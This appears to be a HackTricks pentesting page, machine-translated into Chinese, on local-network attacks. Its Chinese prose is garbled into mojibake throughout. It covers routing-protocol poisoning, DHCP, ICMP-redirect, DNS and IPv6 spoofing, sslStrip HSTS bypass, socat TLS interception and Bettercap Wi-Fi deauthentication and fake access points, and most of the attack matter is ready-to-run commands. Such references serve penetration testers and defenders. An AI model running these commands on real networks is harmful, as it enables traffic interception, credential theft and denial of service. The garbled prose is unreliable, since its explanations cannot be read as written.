è·¯ç”±ä¿¡æ¯åè®®ï¼ˆRIPï¼‰æœ‰ä¸‰ä¸ªç‰ˆæœ¬â€”RIPã€RIPv2å’ŒRIPngã€‚RIPå’ŒRIPv2ä½¿ç”¨UDPæ•°æ®æŠ¥é€šè¿‡ç«¯å£520å‘é€ç»™å¯¹ç­‰ä½“ï¼Œè€ŒRIPngé€šè¿‡IPv6ç»„æ’­å‘UDPç«¯å£521å¹¿æ’­æ•°æ®æŠ¥ã€‚RIPv2å¼•å…¥äº†MD5è®¤è¯æ”¯æŒã€‚RIPngæ²¡æœ‰å†…ç½®è®¤è¯æœºåˆ¶ï¼›ç›¸åï¼Œå®ƒä¾èµ–äºIPv6å†…çš„å¯é€‰IPsec AHå’ŒESPå¤´ã€‚

æœ‰å…³å¦‚ä½•æ”»å‡»æ­¤åè®®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä¹¦ç± _**ç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬ä¸‰ç‰ˆï¼‰**_ã€‚

### EIGRP æ”»å‡»

**EIGRPï¼ˆå¢å¼ºå‹å†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰**æ˜¯ä¸€ç§åŠ¨æ€è·¯ç”±åè®®ã€‚**å®ƒæ˜¯ä¸€ç§è·ç¦»çŸ¢é‡åè®®ã€‚**å¦‚æœå­˜åœ¨**æ— è®¤è¯**å’Œè¢«åŠ¨æ¥å£çš„é…ç½®ï¼Œ**å…¥ä¾µè€…**å¯ä»¥å¹²æ‰°EIGRPè·¯ç”±å¹¶å¯¼è‡´**è·¯ç”±è¡¨ä¸­æ¯’**ã€‚æ­¤å¤–ï¼ŒEIGRPç½‘ç»œï¼ˆæ¢å¥è¯è¯´ï¼Œè‡ªæ²»ç³»ç»Ÿï¼‰**æ˜¯æ‰å¹³çš„ï¼Œæ²¡æœ‰åˆ†å‰²æˆä»»ä½•åŒºåŸŸ**ã€‚å¦‚æœ**æ”»å‡»è€…æ³¨å…¥è·¯ç”±**ï¼Œè¿™æ¡è·¯ç”±å¾ˆå¯èƒ½ä¼šåœ¨æ•´ä¸ªè‡ªæ²»çš„EIGRPç³»ç»Ÿä¸­**ä¼ æ’­**ã€‚

æ”»å‡»EIGRPç³»ç»Ÿéœ€è¦**ä¸åˆæ³•çš„EIGRPè·¯ç”±å™¨å»ºç«‹é‚»æ¥å…³ç³»**ï¼Œè¿™ä¸ºä»åŸºæœ¬ä¾¦å¯Ÿåˆ°å„ç§æ³¨å…¥æä¾›äº†è®¸å¤šå¯èƒ½æ€§ã€‚

\*\*\*\*[**FRRouting**](https://frrouting.org/) å…è®¸ä½ å®ç°**ä¸€ä¸ªæ”¯æŒBGPã€OSPFã€EIGRPã€RIPç­‰åè®®çš„è™šæ‹Ÿè·¯ç”±å™¨ã€‚**ä½ éœ€è¦åšçš„å°±æ˜¯åœ¨æ”»å‡»è€…çš„ç³»ç»Ÿä¸Šéƒ¨ç½²å®ƒï¼Œä½ å°±å¯ä»¥çœŸæ­£åœ°å‡è£…æˆè·¯ç”±åŸŸä¸­çš„åˆæ³•è·¯ç”±å™¨ã€‚

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) ä¹Ÿæ”¯æŒæ•è·EIGRPå¹¿æ’­å’Œæ³¨å…¥æ•°æ®åŒ…ä»¥æ“çºµè·¯ç”±é…ç½®ã€‚æœ‰å…³å¦‚ä½•ä½¿ç”¨Colyæ”»å‡»å®ƒçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ _**ç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬ä¸‰ç‰ˆï¼‰**_ã€‚

### OSPF

å¤§å¤šæ•°å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼ˆOSPFï¼‰å®ç°ä½¿ç”¨MD5æ¥åœ¨è·¯ç”±å™¨ä¹‹é—´æä¾›è®¤è¯ã€‚Lokiå’ŒJohn the Ripperå¯ä»¥æ•è·å¹¶æ”»å‡»MD5å“ˆå¸Œä»¥æ­ç¤ºå¯†é’¥ï¼Œç„¶åå¯ä»¥ä½¿ç”¨è¯¥å¯†é’¥æ¥å®£å‘Šæ–°è·¯ç”±ã€‚è·¯ç”±å‚æ•°é€šè¿‡ä½¿ç”¨_æ³¨å…¥_æ ‡ç­¾è®¾ç½®ï¼Œå¯†é’¥åœ¨_è¿æ¥_ä¸‹è®¾ç½®ã€‚

æœ‰å…³å¦‚ä½•æ”»å‡»æ­¤åè®®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä¹¦ç± _**ç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬ä¸‰ç‰ˆï¼‰**_ã€‚

### å…¶ä»–é€šç”¨å·¥å…·å’Œèµ„æº

* [**Above**](https://github.com/c4s73r/Above): ç”¨äºæ‰«æç½‘ç»œæµé‡å’Œå‘ç°æ¼æ´çš„å·¥å…·
* ä½ å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/Sab0tag3d/MITM-cheatsheet)æ‰¾åˆ°æ›´å¤šå…³äºç½‘ç»œæ”»å‡»çš„ä¿¡æ¯ã€‚_(TODO: é˜…è¯»å…¨éƒ¨å†…å®¹å¹¶æ·»åŠ ä»»ä½•æ–°çš„æ”»å‡»ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰)_

## **æ¬ºéª—**

æ”»å‡»è€…é€šè¿‡å‘é€å‡çš„DHCPå“åº”æ¥é…ç½®ç½‘ç»œæ–°æˆå‘˜çš„æ‰€æœ‰ç½‘ç»œå‚æ•°ï¼ˆGWã€IPã€DNSï¼‰ã€‚
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

æŸ¥çœ‹[å‰ä¸€èŠ‚](./#arp-spoofing)ã€‚

### ICMPRedirect

ICMPé‡å®šå‘æ˜¯æŒ‡å‘é€ä¸€ä¸ªICMPç±»å‹1ä»£ç 5çš„æ•°æ®åŒ…ï¼Œè¡¨æ˜æ”»å‡»è€…æ˜¯åˆ°è¾¾æŸä¸ªIPçš„æœ€ä½³è·¯å¾„ã€‚ç„¶åï¼Œå½“å—å®³è€…æƒ³è¦è”ç³»è¯¥IPæ—¶ï¼Œå®ƒä¼šé€šè¿‡æ”»å‡»è€…å‘é€æ•°æ®åŒ…ã€‚
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

æ”»å‡»è€…å°†è§£æå—å®³è€…è¯·æ±‚çš„éƒ¨åˆ†ï¼ˆæˆ–å…¨éƒ¨ï¼‰åŸŸåã€‚
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**ä½¿ç”¨dnsmasqé…ç½®è‡ªå·±çš„DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### æœ¬åœ°ç½‘å…³

ç³»ç»Ÿå’Œç½‘ç»œé€šå¸¸å­˜åœ¨å¤šæ¡è·¯ç”±ã€‚åœ¨æ„å»ºæœ¬åœ°ç½‘ç»œå†…MACåœ°å€åˆ—è¡¨åï¼Œä½¿ç”¨ _gateway-finder.py_ æ¥è¯†åˆ«æ”¯æŒIPv4è½¬å‘çš„ä¸»æœºã€‚
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [æ¬ºéª—LLMNRã€NBT-NSå’ŒmDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

å½“DNSæŸ¥æ‰¾å¤±è´¥æ—¶ï¼ŒMicrosoftç³»ç»Ÿä½¿ç”¨Link-Local Multicast Name Resolution (LLMNR)å’ŒNetBIOS Name Service (NBT-NS)è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚Apple Bonjourå’ŒLinuxé›¶é…ç½®å®ç°ä½¿ç”¨Multicast DNS (mDNS)åœ¨ç½‘ç»œå†…å‘ç°ç³»ç»Ÿã€‚è¿™äº›åè®®æœªç»è®¤è¯ï¼Œé€šè¿‡UDPå¹¿æ’­æ¶ˆæ¯ï¼›å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·å¼•å¯¼è‡³æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨Responderå†’å……ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€å‡å“åº”ã€‚\
åœ¨æ­¤é˜…è¯»æ›´å¤šå…³äº[å¦‚ä½•ä½¿ç”¨Responderå†’å……æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„ä¿¡æ¯ã€‚

### [æ¬ºéª—WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

è®¸å¤šæµè§ˆå™¨ä½¿ç”¨Web Proxy Auto-Discovery (WPAD)ä»ç½‘ç»œåŠ è½½ä»£ç†è®¾ç½®ã€‚WPADæœåŠ¡å™¨é€šè¿‡ç‰¹å®šURLï¼ˆä¾‹å¦‚ï¼Œ[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)ï¼‰æä¾›å®¢æˆ·ç«¯ä»£ç†è®¾ç½®ï¼Œé€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼è¢«è¯†åˆ«ï¼š

* DHCPï¼Œä½¿ç”¨ä»£ç 252æ¡ç›®[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNSï¼Œåœ¨æœ¬åœ°åŸŸä¸­æœç´¢_wpad_ä¸»æœºå
* Microsoft LLMNRå’ŒNBT-NSï¼ˆåœ¨DNSæŸ¥æ‰¾å¤±è´¥çš„æƒ…å†µä¸‹ï¼‰

Responderè‡ªåŠ¨åŒ–WPADæ”»å‡»â€”â€”è¿è¡Œä»£ç†å¹¶é€šè¿‡DHCPã€DNSã€LLMNRå’ŒNBT-NSå°†å®¢æˆ·ç«¯å¼•å¯¼è‡³æ¶æ„WPADæœåŠ¡å™¨ã€‚\
åœ¨æ­¤é˜…è¯»æ›´å¤šå…³äº[å¦‚ä½•ä½¿ç”¨Responderå†’å……æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„ä¿¡æ¯ã€‚

### [æ¬ºéª—SSDPå’ŒUPnPè®¾å¤‡](spoofing-ssdp-and-upnp-devices.md)

æ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­æä¾›ä¸åŒçš„æœåŠ¡ï¼Œå°è¯•**æ¬ºéª—ç”¨æˆ·**è¾“å…¥ä¸€äº›**æ˜æ–‡å‡­æ®**ã€‚**æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯åœ¨**[**æ¬ºéª—SSDPå’ŒUPnPè®¾å¤‡**](spoofing-ssdp-and-upnp-devices.md)**ã€‚**

### IPv6é‚»å±…æ¬ºéª—

è¿™ç§æ”»å‡»ä¸ARPæ¬ºéª—éå¸¸ç›¸ä¼¼ï¼Œä½†å‘ç”Ÿåœ¨IPv6ä¸–ç•Œä¸­ã€‚æ‚¨å¯ä»¥è®©å—å®³è€…è®¤ä¸ºGWçš„IPv6åœ°å€å…·æœ‰æ”»å‡»è€…çš„MACåœ°å€ã€‚
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 è·¯ç”±å™¨å¹¿å‘Šæ¬ºéª—/æ´ªæ³›

æŸäº›æ“ä½œç³»ç»Ÿé»˜è®¤æ ¹æ®ç½‘ç»œä¸­å‘é€çš„ RA æ•°æ®åŒ…é…ç½®ç½‘å…³ã€‚è¦å£°æ˜æ”»å‡»è€…ä¸º IPv6 è·¯ç”±å™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP æ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›æ“ä½œç³»ç»Ÿå°è¯•é€šè¿‡è¯»å–ç½‘ç»œä¸­çš„ DHCPv6 æ•°æ®åŒ…æ¥é…ç½® DNSã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ª DHCPv6 æ•°æ®åŒ…ï¼Œå°†è‡ªå·±é…ç½®ä¸º DNSã€‚DHCP è¿˜ä¸ºå—å®³è€…æä¾›ä¸€ä¸ª IPv6 åœ°å€ã€‚
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (ä¼ªé€ é¡µé¢å’ŒJSä»£ç æ³¨å…¥)

## äº’è”ç½‘æ”»å‡»

### sslStrip

åŸºæœ¬ä¸Šï¼Œå½“**ç”¨æˆ·**å°è¯•**è®¿é—®**ä¸€ä¸ªæ­£åœ¨**é‡å®šå‘**åˆ°**HTTPS**ç‰ˆæœ¬çš„**HTTP**é¡µé¢æ—¶ï¼Œ**sslStrip**ä¼šä¸**å®¢æˆ·ç«¯**ä¿æŒ**HTTPè¿æ¥**ï¼ŒåŒæ—¶ä¸**æœåŠ¡å™¨**ä¿æŒ**HTTPSè¿æ¥**ï¼Œè¿™æ ·å®ƒå°±èƒ½å¤Ÿä»¥**æ˜æ–‡**å½¢å¼**å—…æ¢**è¿æ¥ã€‚
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
æ›´å¤šä¿¡æ¯[åœ¨æ­¤](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)ã€‚

### sslStrip+ å’Œ dns2proxy ç”¨äºç»•è¿‡ HSTS

**sslStrip+ å’Œ dns2proxy** ä¸ **sslStrip** çš„**åŒºåˆ«**åœ¨äºå®ƒä»¬ä¼šå°†ä¾‹å¦‚ _**www.facebook.com**_ **é‡å®šå‘**åˆ° _**wwww.facebook.com**_ï¼ˆæ³¨æ„é¢å¤–çš„ "**w**"ï¼‰ï¼Œå¹¶å°†è¯¥åŸŸåçš„**åœ°å€è®¾ç½®ä¸ºæ”»å‡»è€…çš„ IP**ã€‚è¿™æ ·ï¼Œ**å®¢æˆ·ç«¯**å°†**è¿æ¥**åˆ° _**wwww.facebook.com**_ï¼ˆå³æ”»å‡»è€…ï¼‰ï¼Œä½†åœ¨å¹•å **sslstrip+** å°†é€šè¿‡ https ä¸ **www.facebook.com** **ä¿æŒçœŸå®è¿æ¥**ã€‚

è¿™é¡¹æŠ€æœ¯çš„**ç›®æ ‡**æ˜¯ä¸ºäº†**é¿å… HSTS**ï¼Œå› ä¸º _**wwww**.facebook.com_ **ä¸ä¼š**è¢«ä¿å­˜åœ¨æµè§ˆå™¨çš„**ç¼“å­˜**ä¸­ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šè¢«æ¬ºéª—æ‰§è¡Œ**HTTP ä¸‹çš„ facebook è®¤è¯**ã€‚\
è¯·æ³¨æ„ï¼Œä¸ºäº†æ‰§è¡Œè¿™ç§æ”»å‡»ï¼Œå—å®³è€…æœ€åˆå°è¯•è®¿é—®çš„å¿…é¡»æ˜¯ [http://www.faceook.com](http://www.faceook.com) è€Œä¸æ˜¯ httpsã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹ http é¡µé¢å†…çš„é“¾æ¥æ¥å®ç°ã€‚

æ›´å¤šä¿¡æ¯[åœ¨æ­¤](https://www.bettercap.org/legacy/#hsts-bypass)ã€[åœ¨æ­¤](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)å’Œ[åœ¨æ­¤](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)ã€‚

**sslStrip æˆ– sslStrip+ ä¸å†æœ‰æ•ˆã€‚è¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¸­é¢„ä¿å­˜äº† HSTS è§„åˆ™ï¼Œæ‰€ä»¥å³ä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªâ€œé‡è¦â€çš„åŸŸåï¼Œä»–ä¹Ÿä¼šé€šè¿‡ HTTPS è®¿é—®å®ƒã€‚å¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œé¢„ä¿å­˜çš„è§„åˆ™å’Œå…¶ä»–ç”Ÿæˆçš„è§„åˆ™å¯ä»¥ä½¿ç”¨æ ‡å¿—** [**`includeSubdomains`**](https://hstspreload.appspot.com) **ï¼Œæ‰€ä»¥ä¹‹å‰çš„** _**wwww.facebook.com**_ **ç¤ºä¾‹ä¸å†æœ‰æ•ˆï¼Œå› ä¸º** _**facebook.com**_ **ä½¿ç”¨äº†å¸¦æœ‰ `includeSubdomains` çš„ HSTSã€‚**

å¾…åŠäº‹é¡¹ï¼šeasy-creds, evilgrade, metasploit, factory

## TCP ç›‘å¬ç«¯å£
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ç›‘å¬ç«¯å£

#### ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### ä½¿ç”¨è¯ä¹¦ç›‘å¬
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
## Bettercap

æœ‰æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯æ£€æŸ¥CAæ˜¯æœ‰æ•ˆçš„ï¼Œä½ å¯ä»¥**æä¾›ç”±CAç­¾åçš„å…¶ä»–ä¸»æœºåçš„è¯ä¹¦**ã€‚\
å¦ä¸€ä¸ªæœ‰è¶£çš„æµ‹è¯•æ˜¯æä¾›ä¸€ä¸ª**è¯·æ±‚çš„ä¸»æœºåçš„è¯ä¹¦ï¼Œä½†å®ƒæ˜¯è‡ªç­¾åçš„**ã€‚

å…¶ä»–è¦æµ‹è¯•çš„äº‹æƒ…æ˜¯å°è¯•ç”¨ä¸€ä¸ªæœ‰æ•ˆçš„è¯ä¹¦æ¥ç­¾åè¯ä¹¦ï¼Œä½†å®ƒä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„CAã€‚æˆ–è€…ä½¿ç”¨æœ‰æ•ˆçš„å…¬é’¥ï¼Œå¼ºåˆ¶ä½¿ç”¨åƒdiffie hellmanè¿™æ ·çš„ç®—æ³•ï¼ˆä¸€ä¸ªä¸éœ€è¦ç”¨çœŸæ­£çš„ç§é’¥è§£å¯†ä»»ä½•ä¸œè¥¿çš„ç®—æ³•ï¼‰ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚çœŸæ­£çš„ç§é’¥çš„è¯æ˜ï¼ˆæ¯”å¦‚å“ˆå¸Œï¼‰æ—¶ï¼Œå‘é€ä¸€ä¸ªå‡çš„è¯æ˜ï¼Œå¹¶æœŸæœ›å®¢æˆ·ç«¯ä¸æ£€æŸ¥è¿™ä¸ªã€‚
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### ä¸»åŠ¨å‘ç°ç¬”è®°

è¯·æ³¨æ„ï¼Œå½“UDPæ•°æ®åŒ…å‘é€åˆ°æ²¡æœ‰è¯·æ±‚ç«¯å£çš„è®¾å¤‡æ—¶ï¼Œä¼šå‘é€ICMPï¼ˆç«¯å£ä¸å¯è¾¾ï¼‰ã€‚

### **ARP å‘ç°**

ARPæ•°æ®åŒ…ç”¨äºå‘ç°ç½‘ç»œå†…æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€ã€‚PCå¿…é¡»å¯¹æ¯ä¸ªå¯èƒ½çš„IPåœ°å€å‘é€è¯·æ±‚ï¼Œåªæœ‰æ­£åœ¨ä½¿ç”¨çš„åœ°å€ä¼šå“åº”ã€‚

### **mDNSï¼ˆå¤šæ’­DNSï¼‰**

Bettercapæ¯éš”Xæ¯«ç§’å‘é€ä¸€ä¸ªMDNSè¯·æ±‚ï¼Œè¯¢é—® **\_services\_.dns-sd.\_udp.local**ï¼Œçœ‹åˆ°æ­¤æ•°æ®åŒ…çš„æœºå™¨é€šå¸¸ä¼šå›åº”æ­¤è¯·æ±‚ã€‚ç„¶åï¼Œå®ƒåªæœç´¢å›åº”"services"çš„æœºå™¨ã€‚

**å·¥å…·**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNSï¼ˆNetBiosåç§°æœåŠ¡å™¨ï¼‰**

Bettercapå‘137/UDPç«¯å£å¹¿æ’­æ•°æ®åŒ…ï¼Œè¯¢é—®åä¸º"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"çš„åç§°ã€‚

### **SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰**

Bettercapå¹¿æ’­SSDPæ•°æ®åŒ…ï¼Œæœç´¢æ‰€æœ‰ç±»å‹çš„æœåŠ¡ï¼ˆUDPç«¯å£1900ï¼‰ã€‚

### **WSDï¼ˆWebæœåŠ¡å‘ç°ï¼‰**

Bettercapå¹¿æ’­WSDæ•°æ®åŒ…ï¼Œæœç´¢æœåŠ¡ï¼ˆUDPç«¯å£3702ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**æ¼æ´èµé‡‘å°è´´å£«**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºï¼Œä¸ºé»‘å®¢æœåŠ¡çš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
